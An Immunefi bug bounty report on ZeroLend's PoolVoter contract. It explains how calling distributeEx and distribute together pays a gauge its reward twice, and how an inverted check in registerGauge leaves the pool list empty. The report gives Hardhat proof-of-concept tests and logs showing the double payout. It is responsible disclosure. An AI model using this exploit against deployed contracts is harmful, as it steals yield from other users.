# 29078 - \[SC - High] Theft of unclaimed yield due to the wrong calcu...

## Theft of unclaimed yield due to the wrong calculation of claimable amout for a gauge that allow hackers to get the double reward from the Poolvoter contract.

Submitted on Mar 6th 2024 at 17:15:36 UTC by @perseverance for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29078

Report type: Smart Contract

Report severity: High

Target: <https://github.com/zerolend/governance>

Impacts:

* Theft of unclaimed yield

### Description

## Description

Theft of unclaimed yield due to the wrong calculation of claimable amout for a gauge that allow hackers to get the double reward from the Poolvoter contract.

### Brief/Intro

The Zerolend provide the Incentive program as described in the Documentation of the protocol: <https://docs.zerolend.xyz/zeronomics/token-overview>

```
3. Incentive Programs: The protocol will conduct various incentive programs to encourage users to engage with the platform actively. These programs can offer token rewards or other benefits to participants who perform certain actions, such as providing liquidity, referring new users, or completing specific tasks within the ecosystem.

```

According to the Zerolend Boost Technical Walkthrough, this is done via the Poolvoter contract <https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol>

The contract will receive the reward via the function notifyRewardAmount

<https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol#L154-L158>

```solidity
function notifyRewardAmount(uint256 amount) public nonReentrant {
        reward.safeTransferFrom(msg.sender, address(this), amount); // transfer the distro in
        uint256 _ratio = (amount * 1e18) / totalWeight; // 1e18 adjustment is removed during claim
        if (_ratio > 0) index += _ratio;
    }

```

So the program will give the rewards to participants who perform actions such as providing liquidity. The contract will provide the rewards for all the pools in the list:

<https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol#L22>

```solidity
address[] internal _pools; // all pools viable for incentives

```

The reward is distributed based on the weights\[pool]/totalWeight.

So if in the \_pools there are 2 Pools POOL\_0 and POOL\_1 with weights is 25 (POOL\_0) and 75 (POOL\_1), then the total weight is 100.

weight\[POOL\_0] = 25

weight\[POOL\_1] = 75

\=> So if the reward amount = 100 then

Reward for POOL\_0 = 25

Reward for POOL\_1 = 75

### Vulnerability Details

#### Bug2

So this vulnerability will allow POOL\_0 to get the reward = 50 that is double the intended reward by the system.

Details:

So the reward can be distributed by function distribute

```solidity
function distribute(address _gauge) public nonReentrant {
        uint256 _claimable = claimable[_gauge];
        claimable[_gauge] = 0;
        IERC20(reward).approve(_gauge, 0); // first set to 0, this helps reset some non-standard tokens
        IERC20(reward).approve(_gauge, _claimable);
        if (!IGauge(_gauge).notifyRewardAmount(address(reward), _claimable)) {
            // can return false, will simply not distribute tokens
            claimable[_gauge] = _claimable; 
        }
    }
```

So the reward here is calculated based on claimable\[\_gauge].

But the reward can be also distributed by function distributeEx

<https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/voter/PoolVoter.sol#L214-L235>

```solidity
function distributeEx(
        address token,
        uint256 start,
        uint256 finish
    ) public nonReentrant {
        uint256 _balance = IERC20(token).balanceOf(address(this));
        if (_balance > 0 && totalWeight > 0) {
            uint256 _totalWeight = totalWeight;
            for (uint256 x = start; x < finish; x++) {
                uint256 _reward = (_balance * weights[_pools[x]]) /
                    _totalWeight;
                if (_reward > 0) {
                    address _gauge = gauges[_pools[x]];

                    IERC20(token).approve(_gauge, 0); // first set to 0, this helps reset some non-standard tokens
                    IERC20(token).approve(_gauge, _reward);
                    IGauge(_gauge).notifyRewardAmount(token, _reward); // can return false, will simply not distribute tokens
                }
            }
        }
    }
```

So notice that the reward in function distributeEx is calculated directly based on the balance of token (e.g. reward token), weights\[pool] and totalWeight. But here the claimable\[\_gauge] is not updated. So by calling distributeEx and distribute(address), the hackers can get double reward from the protocol. By doing so, he steal unclaimed yield from others.

If a hacker deposit or borrow into a pool (POOL\_0) and can get 50% of reward of POOL\_0. According to the design of the protocol, if POOL\_0 have weights is 25% of the total reward then the reward should be

REWARD\_AMOUNT \* 0.25 \* 0.5 = 0.0125 \* REWARD\_AMOUNT

But by calling distributeEx and distribute(address \_gauge), the hacker can get double the reward

REWARD\_AMOUT \* 0.25\* 2 \* 0.5 = 0.25 \* REWARD\_AMOUT = 2 times

So the profit can be 2 times in one scenario.

I demonstrated this in my POC.

```typescript
it("Test the distributeEx of PoolVoter contract to get the double reward", async function () {
    expect(await poolVoter.totalWeight()).eq(0); 
    console.log("totalWeight: ", await poolVoter.totalWeight()); 
    
    console.log("length of pools:", await poolVoter.length());
    console.log("zero balance of PoolVoter: ", await zero.balanceOf(poolVoter.target)); // Should be 0
    console.log("Step: the Deployer (the owner of Zero token) approve the PoolVoter to spend 100 ZERO token");
    
    // For this test case, just need dummy _asset and _gauge 
    const [_asset,_gauge] = await hre.ethers.getSigners();
    await poolVoter.connect(deployer).registerGauge(_asset.address,_gauge.address);
    
    await poolVoter.connect(ant).vote([reserve.target,_asset.address], [1e8,3e8]);
    console.log("after vote totalWeight: ", await poolVoter.totalWeight()); 
    console.log("length of pools:", await poolVoter.length());
             
    await zero.connect(deployer).approve(poolVoter.target, e18 * 100n);
    await poolVoter.connect(deployer).notifyRewardAmount(e18 * 100n);
    console.log("After notifyRewardAmout zero balance of PoolVoter: ", await zero.balanceOf(poolVoter.target));
    
       
    console.log("Before distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("Before distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));
    console.log("Step: Call distributeEx to distribute the reward");
    await poolVoter.connect(ant)["distributeEx(address,uint256,uint256)"](zero.target,0,1);
    console.log("After distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("After distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));

    await poolVoter.connect(ant)["distributeEx(address,uint256,uint256)"](zero.target,0,1);
    console.log("After distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("After distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));
    splitterGauge = await hre.ethers.getContractAt("LendingPoolGauge", await poolVoter.gauges(reserve.target));
    console.log("The claimable reward of gauge: ", await poolVoter.claimable(splitterGauge.target));
    console.log("Call the updateFor gauge to update the claimable reward for the gauge");
    await poolVoter.connect(ant).updateFor(splitterGauge.target);
    console.log("The claimable reward of gauge: ", await poolVoter.claimable(splitterGauge.target));
    console.log("Call the claimFor gauge to claim the reward for the gauge");
    
    await poolVoter.connect(ant)["distribute(address)"](splitterGauge.target);
    console.log("After distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("After distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));


  });

```

So assume that the reward is 100 ZERO Token (= 100 \* 10 ^18).

For POOL\_0 has weight is 25%

POOL\_1 has weight is 75%

So the reward should be split:

POOL\_0 should have reward 25 = (25 \* 10 ^ 18)

POOL\_1 should have reward 75 = (75 \* 10 ^ 18 )

But as the test log showed that POOL\_0 can get the total reward = 12499999999999999998 + 37499999999999999994 = 49.999 \* 10\*\*18 = 2 times of 25 \* 10 ^ 18

```log
After distributeEx zero balance of aTokenGauge:  12499999999999999998n
After distributeEx zero balance of varTokenGauge:  37499999999999999994n
```

Full test log:

```log
totalWeight:  0n
after vote totalWeight:  0n
length of pools: 1n
zero balance of PoolVoter:  0n
Step: the Deployer (the owner of Zero token) approve the PoolVoter to spend 100 ZERO token
after vote totalWeight:  19953322710553018772n
length of pools: 2n
After notifyRewardAmout zero balance of PoolVoter:  100000000000000000000n
Before distributeEx zero balance of aTokenGauge:  0n
Before distributeEx zero balance of varTokenGauge:  0n
Step: Call distributeEx to distribute the reward
After distributeEx zero balance of aTokenGauge:  6250000000000000000n
After distributeEx zero balance of varTokenGauge:  18750000000000000000n
After distributeEx zero balance of aTokenGauge:  6250000000000000000n
After distributeEx zero balance of varTokenGauge:  18750000000000000000n
The claimable reward of gauge:  0n
Call the updateFor gauge to update the claimable reward for the gauge
The claimable reward of gauge:  24999999999999999995n
Call the claimFor gauge to claim the reward for the gauge
After distributeEx zero balance of aTokenGauge:  12499999999999999998n
After distributeEx zero balance of varTokenGauge:  37499999999999999994n
    ✔ Test the distributeEx of PoolVoter contract to get the double reward (296ms)
```

#### Bug1

To run the POC for this bug (Bug1), we need to fix another bug that cause the protocol failed to work. Since the Impact "Contract fails to deliver promised returns" is not in the scope of this Bug bounty Program, so I report this bug here. I am sure that the protocol need to fix it.

This bug causes the \_pool array is always empty and make some functions of the protocol do not work.

To register a Gauge, the owner need to call the function registerGauge

<https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol#L132-L147>

```solidity

function registerGauge(
        address _asset,
        address _gauge
    ) external onlyOwner returns (address) {
        if (isPool[_asset]) { 
            _pools.push(_asset);
            isPool[_asset] = true;
        }

        bribes[_gauge] = address(0);
        gauges[_asset] = _gauge;
        poolForGauge[_gauge] = _asset;
        _updateFor(_gauge);

        return _gauge;
    }

```

Notice the global array \_pools and isPool

<https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol#L22-L24>

```solidity
address[] internal _pools; // all pools viable for incentives
 mapping(address => bool) public isPool; // pool => bool
```

Here the check isPool\[\_asset] will always be false

```solidity
if (isPool[_asset]) { 
            _pools.push(_asset);
            isPool[_asset] = true;
        }

```

so the code inside the "if" branch never get executed. In the contract PoolVoter, There is no function to set isPool\[\_asset] to true except the function registerGauge. So this will cause the \_pools array is always empty and isPool of the \_asset always be false.

There are some functions in the PoolVoter.sol will not work as expected because of this bug.

<https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol#L192-L200>

```solidity
function distribute() external {
        distribute(0, _pools.length);
    }

    function distribute(uint256 start, uint256 finish) public {
        for (uint256 x = start; x < finish; x++) {
            distribute(gauges[_pools[x]]);
        }
    }
```

Because the the \_pools is always empty, so \_pools\[x] always return 0 so the gauges\[address(0x00)] always return 0.

<https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/voter/PoolVoter.sol#L181-L190>

```solidity
function distribute(address _gauge) public nonReentrant {
        uint256 _claimable = claimable[_gauge];
        claimable[_gauge] = 0;
        IERC20(reward).approve(_gauge, 0); // first set to 0, this helps reset some non-standard tokens
        IERC20(reward).approve(_gauge, _claimable);
        if (!IGauge(_gauge).notifyRewardAmount(address(reward), _claimable)) {
            // can return false, will simply not distribute tokens
            claimable[_gauge] = _claimable; 
        }
    }
```

When \_gauge is 0x00 then the distribute always send \_claimable = 0. There is no reward can be distributed.

2 other functions also does not work as expected.

<https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/voter/PoolVoter.sol#L208-L234>

```solidity
function distributeEx(address token) external {
        distributeEx(token, 0, _pools.length);
    }

    // setup distro > then distribute

    function distributeEx(
        address token,
        uint256 start,
        uint256 finish
    ) public nonReentrant {
        uint256 _balance = IERC20(token).balanceOf(address(this));
        if (_balance > 0 && totalWeight > 0) {
            uint256 _totalWeight = totalWeight;
            for (uint256 x = start; x < finish; x++) {
                uint256 _reward = (_balance * weights[_pools[x]]) /
                    _totalWeight;
                if (_reward > 0) {
                    address _gauge = gauges[_pools[x]];

                    IERC20(token).approve(_gauge, 0); // first set to 0, this helps reset some non-standard tokens
                    IERC20(token).approve(_gauge, _reward);
                    IGauge(_gauge).notifyRewardAmount(token, _reward); // can return false, will simply not distribute tokens
                }
            }
        }
    }

```

Because the the \_pools is always empty, so \_pools\[x] always return 0 so the weights\[0x00] always return 0, so this function will not distribute any reward.

The function length() always return 0. <https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/voter/PoolVoter.sol#L149-L151>

```solidiyty
 function length() external view returns (uint256) {
        return _pools.length;
    }

```

## Impacts

## About the severity assessment

The main bug Bug2: Theft of unclaimed yield due to the wrong calculation of claimable amout for a gauge that allow hackers to get the double reward from the Poolvoter contract. This bug allow the hackers to double the reward get from the protocol and thus steal yield from other users.

This bug is High category "Theft of unclaimed yield"

### Proof of concept

## Proof of concept

## Proof of concept

Clone the latest governance contract repository from Github: <https://github.com/zerolend/governance/tree/a30d8bb825306dfae1ec5a5a47658df57fd1189b>

```
git clone https://github.com/zerolend/governance.git
```

Use the Git patch file: Bug2\_diff.patch

<https://drive.google.com/file/d/1Ed3FiV3K8Ob9JqnzoI-k0xwx24RmicX6/view?usp=sharing>

To apply Git patch file for governance repository based on the commit: <https://github.com/zerolend/governance/tree/a30d8bb825306dfae1ec5a5a47658df57fd1189b>

```bash
git apply Bug2_diff.patch 

```

cd to folder governance, To run the test, you need to

1. rename .env.example to .env
2. put the test Private\_key to the variable

```
WALLET_PRIVATE_KEY= 
 NODE_ENV == "test" 
```

Then run

```
yarn install
yarn test  > test_all.log

```

The POC code:

```typescript
it("Test the distributeEx of PoolVoter contract to get the double reward", async function () {
    expect(await poolVoter.totalWeight()).eq(0); 
    console.log("totalWeight: ", await poolVoter.totalWeight()); 
    //await poolVoter.connect(ant).vote([reserve.target], [1e8]);
    //expect(await poolVoter.totalWeight()).greaterThan(e18 * 19n);
    console.log("after vote totalWeight: ", await poolVoter.totalWeight()); 
    console.log("length of pools:", await poolVoter.length());
    console.log("zero balance of PoolVoter: ", await zero.balanceOf(poolVoter.target)); // Should be 0
    console.log("Step: the Deployer (the owner of Zero token) approve the PoolVoter to spend 100 ZERO token");
    
    // For this test case, just need dummy _asset and _gauge 
    const [_asset,_gauge] = await hre.ethers.getSigners();
    await poolVoter.connect(deployer).registerGauge(_asset.address,_gauge.address);
    
    await poolVoter.connect(ant).vote([reserve.target,_asset.address], [1e8,3e8]); // For Pool_0 weight is 25 and Pool_1 weight is 75
    console.log("after vote totalWeight: ", await poolVoter.totalWeight()); 
    console.log("length of pools:", await poolVoter.length());
             
    await zero.connect(deployer).approve(poolVoter.target, e18 * 100n);
    await poolVoter.connect(deployer).notifyRewardAmount(e18 * 100n);
    console.log("After notifyRewardAmout zero balance of PoolVoter: ", await zero.balanceOf(poolVoter.target));
    
       
    console.log("Before distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("Before distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));
    console.log("Step: Call distributeEx to distribute the reward");
    await poolVoter.connect(ant)["distributeEx(address,uint256,uint256)"](zero.target,0,1);
    console.log("After distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("After distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));

    await poolVoter.connect(ant)["distributeEx(address,uint256,uint256)"](zero.target,0,1);
    console.log("After distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("After distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));
    splitterGauge = await hre.ethers.getContractAt("LendingPoolGauge", await poolVoter.gauges(reserve.target));
    console.log("The claimable reward of gauge: ", await poolVoter.claimable(splitterGauge.target));
    console.log("Call the updateFor gauge to update the claimable reward for the gauge");
    await poolVoter.connect(ant).updateFor(splitterGauge.target);
    console.log("The claimable reward of gauge: ", await poolVoter.claimable(splitterGauge.target));
    console.log("Call the claimFor gauge to claim the reward for the gauge");
    
    await poolVoter.connect(ant)["distribute(address)"](splitterGauge.target);
    console.log("After distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("After distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));


  });

```

The test log: <https://drive.google.com/file/d/1LlCyR6mSFRkbhhv9PhmEcdnQ5o43dx6N/view?usp=sharing>

```
totalWeight:  0n
after vote totalWeight:  0n
length of pools: 1n
zero balance of PoolVoter:  0n
Step: the Deployer (the owner of Zero token) approve the PoolVoter to spend 100 ZERO token
after vote totalWeight:  19953116596905124301n
length of pools: 2n
After notifyRewardAmout zero balance of PoolVoter:  100000000000000000000n
Before distributeEx zero balance of aTokenGauge:  0n
Before distributeEx zero balance of varTokenGauge:  0n
Step: Call distributeEx to distribute the reward
After distributeEx zero balance of aTokenGauge:  6249999999999999999n
After distributeEx zero balance of varTokenGauge:  18749999999999999997n
After distributeEx zero balance of aTokenGauge:  6249999999999999999n
After distributeEx zero balance of varTokenGauge:  18749999999999999997n
The claimable reward of gauge:  0n
Call the updateFor gauge to update the claimable reward for the gauge
The claimable reward of gauge:  24999999999999999997n
Call the claimFor gauge to claim the reward for the gauge
After distributeEx zero balance of aTokenGauge:  12499999999999999998n
After distributeEx zero balance of varTokenGauge:  37499999999999999994n
    ✔ Test the distributeEx of PoolVoter contract to get the double reward (286ms)
```

***

For Bug1 POC:

To run the POC:

Clone the latest governance contract repository from Github: <https://github.com/zerolend/governance/tree/a30d8bb825306dfae1ec5a5a47658df57fd1189b>

```
git clone https://github.com/zerolend/governance.git
```

Or you can use the Git patch file: Bug1\_diff.patch

<https://drive.google.com/file/d/1bxNFrItUN6Po4HTCrucjsHhOgAfE3bzv/view?usp=sharing>

To apply Git patch file for governance repository based on the commit: <https://github.com/zerolend/governance/tree/a30d8bb825306dfae1ec5a5a47658df57fd1189b>

```bash
git apply Bug1_diff.patch 

```

***

cd to folder governance, To run the test, you need to

1. rename .env.example to .env
2. put the test Private\_key to the variable

```
WALLET_PRIVATE_KEY= 
 NODE_ENV == "test" 
```

Then run

```
yarn install 
yarn test 

```

POC Test code:

```typescript

it("Test the distributeEx(token,start,finish) of PoolVoter contract ", async function () {
    expect(await poolVoter.totalWeight()).eq(0); 
    console.log("totalWeight: ", await poolVoter.totalWeight()); 
    await poolVoter.connect(ant).vote([reserve.target], [1e8]);
    expect(await poolVoter.totalWeight()).greaterThan(e18 * 19n);
    console.log("after vote totalWeight: ", await poolVoter.totalWeight()); 
    console.log("length of pools:", await poolVoter.length());
    console.log("zero balance of PoolVoter: ", await zero.balanceOf(poolVoter.target)); // Should be 0
    console.log("Step: the Deployer (the owner of Zero token) approve the PoolVoter to spend 100 ZERO token");
    await zero.connect(deployer).approve(poolVoter.target, e18 * 100n);
    await poolVoter.connect(deployer).notifyRewardAmount(e18 * 100n);

    splitterGauge = await hre.ethers.getContractAt("LendingPoolGauge", await poolVoter.gauges(reserve.target));
    console.log("The claimable reward of gauge: ", await poolVoter.claimable(splitterGauge.target));
    
    await poolVoter.connect(ant).updateFor(splitterGauge.target);
    console.log("The claimable reward of gauge: ", await poolVoter.claimable(splitterGauge.target));

    console.log("After notifyRewardAmout zero balance of PoolVoter: ", await zero.balanceOf(poolVoter.target));
    console.log("Step: Call distributeEx to distribute the reward");
    console.log("Before distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("Before distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));
    await poolVoter.connect(ant)["distributeEx(address,uint256,uint256)"](zero.target,0,1);
    console.log("After distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("After distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));

  });

  it("Test the distribute() of PoolVoter contract ", async function () {
    expect(await poolVoter.totalWeight()).eq(0); 
    console.log("totalWeight: ", await poolVoter.totalWeight()); 
    await poolVoter.connect(ant).vote([reserve.target], [1e8]);
    expect(await poolVoter.totalWeight()).greaterThan(e18 * 19n);
    console.log("after vote totalWeight: ", await poolVoter.totalWeight()); 
    console.log("length of pools:", await poolVoter.length());
    console.log("zero balance of PoolVoter: ", await zero.balanceOf(poolVoter.target)); // Should be 0
    console.log("Step: the Deployer (the owner of Zero token) approve the PoolVoter to spend 100 ZERO token");
    await zero.connect(deployer).approve(poolVoter.target, e18 * 100n);
    await poolVoter.connect(deployer).notifyRewardAmount(e18 * 100n);

    splitterGauge = await hre.ethers.getContractAt("LendingPoolGauge", await poolVoter.gauges(reserve.target));
    console.log("The claimable reward of gauge: ", await poolVoter.claimable(splitterGauge.target));
    
    await poolVoter.connect(ant).updateFor(splitterGauge.target);
    console.log("The claimable reward of gauge: ", await poolVoter.claimable(splitterGauge.target));
    console.log("Call the claimFor gauge to claim the reward for the gauge");

    console.log("After notifyRewardAmout zero balance of PoolVoter: ", await zero.balanceOf(poolVoter.target));
    console.log("Step: Call distributeEx to distribute the reward");
    console.log("Before distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("Before distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));
    await poolVoter.connect(ant)["distribute()"]();
    console.log("After distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("After distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));
    
  });

  it("Test the distribute(uint256 start,uint256 finish) of PoolVoter contract ", async function () {
    expect(await poolVoter.totalWeight()).eq(0); 
    console.log("totalWeight: ", await poolVoter.totalWeight()); 
    await poolVoter.connect(ant).vote([reserve.target], [1e8]);
    expect(await poolVoter.totalWeight()).greaterThan(e18 * 19n);
    console.log("after vote totalWeight: ", await poolVoter.totalWeight()); 
    console.log("length of pools:", await poolVoter.length());
    console.log("zero balance of PoolVoter: ", await zero.balanceOf(poolVoter.target)); // Should be 0
    console.log("Step: the Deployer (the owner of Zero token) approve the PoolVoter to spend 100 ZERO token");
    await zero.connect(deployer).approve(poolVoter.target, e18 * 100n);
    await poolVoter.connect(deployer).notifyRewardAmount(e18 * 100n);

    splitterGauge = await hre.ethers.getContractAt("LendingPoolGauge", await poolVoter.gauges(reserve.target));
    console.log("The claimable reward of gauge: ", await poolVoter.claimable(splitterGauge.target));
    
    await poolVoter.connect(ant).updateFor(splitterGauge.target);
    console.log("The claimable reward of gauge: ", await poolVoter.claimable(splitterGauge.target));
    console.log("Call the claimFor gauge to claim the reward for the gauge");

    console.log("After notifyRewardAmout zero balance of PoolVoter: ", await zero.balanceOf(poolVoter.target));
    console.log("Step: Call distributeEx to distribute the reward");
    console.log("Before distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("Before distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));
    await poolVoter.connect(ant)["distribute(uint256,uint256)"](0,1);
    console.log("After distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("After distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));
    
  });

  it("Test the distributeEx(token,start,finish) of PoolVoter contract 3 ", async function () {
    expect(await poolVoter.totalWeight()).eq(0); 
    console.log("totalWeight: ", await poolVoter.totalWeight()); 
    await poolVoter.connect(ant).vote([reserve.target], [1e8]);
    expect(await poolVoter.totalWeight()).greaterThan(e18 * 19n);
    console.log("after vote totalWeight: ", await poolVoter.totalWeight()); 
    console.log("length of pools:", await poolVoter.length());
    console.log("zero balance of PoolVoter: ", await zero.balanceOf(poolVoter.target)); // Should be 0
    console.log("Step: the Deployer (the owner of Zero token) approve the PoolVoter to spend 100 ZERO token");
    await zero.connect(deployer).approve(poolVoter.target, e18 * 100n);
    await poolVoter.connect(deployer).notifyRewardAmount(e18 * 100n);
    console.log("After notifyRewardAmout zero balance of PoolVoter: ", await zero.balanceOf(poolVoter.target));
    
    splitterGauge = await hre.ethers.getContractAt("LendingPoolGauge", await poolVoter.gauges(reserve.target));
    console.log("The claimable reward of gauge: ", await poolVoter.claimable(splitterGauge.target));
    
    await poolVoter.connect(ant).updateFor(splitterGauge.target);
    console.log("The claimable reward of gauge: ", await poolVoter.claimable(splitterGauge.target));
    console.log("Call the claimFor gauge to claim the reward for the gauge");


    console.log("Step: Call distribute to distribute the reward");
   
    console.log("Before distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("Before distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));
    console.log("Step: Call distributeEx to distribute the reward");
    await poolVoter.connect(ant)["distributeEx(address,uint256,uint256)"](zero.target,0,1);
    console.log("After distributeEx zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("After distributeEx zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));

  });

```

Test log for Bug1 POC: <https://drive.google.com/file/d/1Xc2E18UJqLFpyEdS\\_zla34uQOG5rEW-5/view?usp=sharing>

```bash
 yarn test > test_all_240306_1340.log   
```

```log
yarn run v1.22.19
$ hardhat test


  PoolVoter
    ✔ ant should be able to vote properly
totalWeight:  0n
after vote totalWeight:  19953751109842719431n
length of pools: 0n
zero balance of PoolVoter:  0n
Step: the Deployer (the owner of Zero token) approve the PoolVoter to spend 100 ZERO token
The claimable reward of gauge:  0n
The claimable reward of gauge:  99999999999999999997n
After notifyRewardAmout zero balance of PoolVoter:  100000000000000000000n
Step: Call distributeEx to distribute the reward
Before distributeEx zero balance of aTokenGauge:  0n
Before distributeEx zero balance of varTokenGauge:  0n
    1) Test the distributeEx(token,start,finish) of PoolVoter contract 
totalWeight:  0n
after vote totalWeight:  19953751109842719431n
length of pools: 0n
zero balance of PoolVoter:  0n
Step: the Deployer (the owner of Zero token) approve the PoolVoter to spend 100 ZERO token
The claimable reward of gauge:  0n
The claimable reward of gauge:  99999999999999999997n
Call the claimFor gauge to claim the reward for the gauge
After notifyRewardAmout zero balance of PoolVoter:  100000000000000000000n
Step: Call distributeEx to distribute the reward
Before distributeEx zero balance of aTokenGauge:  0n
Before distributeEx zero balance of varTokenGauge:  0n
After distributeEx zero balance of aTokenGauge:  0n
After distributeEx zero balance of varTokenGauge:  0n
    ✔ Test the distribute() of PoolVoter contract  (150ms)
totalWeight:  0n
after vote totalWeight:  19953751109842719431n
length of pools: 0n
zero balance of PoolVoter:  0n
Step: the Deployer (the owner of Zero token) approve the PoolVoter to spend 100 ZERO token
The claimable reward of gauge:  0n
The claimable reward of gauge:  99999999999999999997n
Call the claimFor gauge to claim the reward for the gauge
After notifyRewardAmout zero balance of PoolVoter:  100000000000000000000n
Step: Call distributeEx to distribute the reward
Before distributeEx zero balance of aTokenGauge:  0n
Before distributeEx zero balance of varTokenGauge:  0n
    1) Test the distribute(uint256 start,uint256 finish) of PoolVoter contract 
totalWeight:  0n
after vote totalWeight:  19953751109842719431n
length of pools: 0n
zero balance of PoolVoter:  0n
Step: the Deployer (the owner of Zero token) approve the PoolVoter to spend 100 ZERO token
After notifyRewardAmout zero balance of PoolVoter:  100000000000000000000n
The claimable reward of gauge:  0n
The claimable reward of gauge:  99999999999999999997n
Call the claimFor gauge to claim the reward for the gauge
Step: Call distribute to distribute the reward
Before distributeEx zero balance of aTokenGauge:  0n
Before distributeEx zero balance of varTokenGauge:  0n
Step: Call distributeEx to distribute the reward
    1) Test the distributeEx(token,start,finish) of PoolVoter contract 3 
    handleAction test
      ✔ supplying an asset with ZERO staked should give staking rewards (120ms)


  3 passing (14s)
  3 failing

  1) PoolVoter
       Test the distributeEx(token,start,finish) of PoolVoter contract :
     Error: VM Exception while processing transaction: reverted with panic code 0x32 (Array accessed at an out-of-bounds or negative index)
    at PoolVoter.distributeEx (contracts/voter/PoolVoter.sol:224)
    at processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async HardhatNode._mineBlockWithPendingTxs (node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:1931:23)
    at async HardhatNode.mineBlock (node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:558:16)
    at async EthModule._sendTransactionAndReturnHash (node_modules/hardhat/src/internal/hardhat-network/provider/modules/eth.ts:1491:18)
    at async HardhatNetworkProvider.request (node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:124:18)
    at async HardhatEthersSigner.sendTransaction (node_modules/@nomicfoundation/hardhat-ethers/src/signers.ts:125:18)
    at async send (node_modules/ethers/src.ts/contract/contract.ts:313:20)
  

  2) PoolVoter
       Test the distribute(uint256 start,uint256 finish) of PoolVoter contract :
     Error: VM Exception while processing transaction: reverted with panic code 0x32 (Array accessed at an out-of-bounds or negative index)
    at PoolVoter.distribute (contracts/voter/PoolVoter.sol:199)
    at processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async HardhatNode._mineBlockWithPendingTxs (node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:1931:23)
    at async HardhatNode.mineBlock (node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:558:16)
    at async EthModule._sendTransactionAndReturnHash (node_modules/hardhat/src/internal/hardhat-network/provider/modules/eth.ts:1491:18)
    at async HardhatNetworkProvider.request (node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:124:18)
    at async HardhatEthersSigner.sendTransaction (node_modules/@nomicfoundation/hardhat-ethers/src/signers.ts:125:18)
    at async send (node_modules/ethers/src.ts/contract/contract.ts:313:20)
  

  3) PoolVoter
       Test the distributeEx(token,start,finish) of PoolVoter contract 3 :
     Error: VM Exception while processing transaction: reverted with panic code 0x32 (Array accessed at an out-of-bounds or negative index)
    at PoolVoter.distributeEx (contracts/voter/PoolVoter.sol:224)
    at processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async HardhatNode._mineBlockWithPendingTxs (node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:1931:23)
    at async HardhatNode.mineBlock (node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:558:16)
    at async EthModule._sendTransactionAndReturnHash (node_modules/hardhat/src/internal/hardhat-network/provider/modules/eth.ts:1491:18)
    at async HardhatNetworkProvider.request (node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:124:18)
    at async HardhatEthersSigner.sendTransaction (node_modules/@nomicfoundation/hardhat-ethers/src/signers.ts:125:18)
    at async send (node_modules/ethers/src.ts/contract/contract.ts:313:20)
  



info Visit https://yarnpkg.com/en/docs/cli/run for documentation about this command.

```
